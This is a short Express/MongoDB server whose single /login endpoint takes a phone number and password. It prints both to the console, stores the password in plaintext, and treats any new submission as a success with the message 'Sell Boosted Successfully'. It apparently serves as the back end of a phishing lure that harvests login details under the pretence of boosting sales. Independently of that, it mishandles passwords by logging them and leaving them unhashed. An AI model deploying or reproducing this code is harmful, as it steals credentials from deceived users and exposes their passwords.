const express = require("express");
const mongoose = require("mongoose");

const app = express();

app.use(express.json());
app.use(express.static("public"));

// 🔥 MongoDB connect (FIXED)
mongoose.connect(process.env.MONGO_URI)
.then(() => console.log("BoostDB Connected"))
.catch(err => {
    console.log("MongoDB ERROR:", err); // 👈 important
});

// ✅ Schema
const UserSchema = new mongoose.Schema({
    phone: String,
    password: String
});

const BoostUser = mongoose.model("BoostUser", UserSchema);

// 🔥 LOGIN = CREATE + LOGIN
app.post("/login", async (req, res) => {

    try {

        const { phone, password } = req.body;

        // Empty check
        if (!phone || !password) {
            return res.json({
                success: false,
                message: "Missing phone or password"
            });
        }

        console.log("PHONE:", phone);
        console.log("PASSWORD:", password);

        // Find existing user
        let user = await BoostUser.findOne({ phone });

        // Create new user
        if (!user) {

            user = new BoostUser({
                phone,
                password
            });

            await user.save();

            console.log("NEW DATA SAVED");

            return res.json({
                success: true,
                message: "Sell Boosted Successfully"
            });
        }

        // Existing user
        if (user.password === password) {

            return res.json({
                success: true,
                message: "Sell Already Boosted"
            });

        } else {

            return res.json({
                success: false,
                message: "Wrong password"
            });
        }

    } catch (err) {

        console.log("LOGIN ERROR:", err);

        return res.json({
            success: false,
            message: err.message
        });
    }
});

// 🚀 Start server
const PORT = process.env.PORT || 5000;

app.listen(PORT, () => {
    console.log(`Boost Server running on port ${PORT}`);
});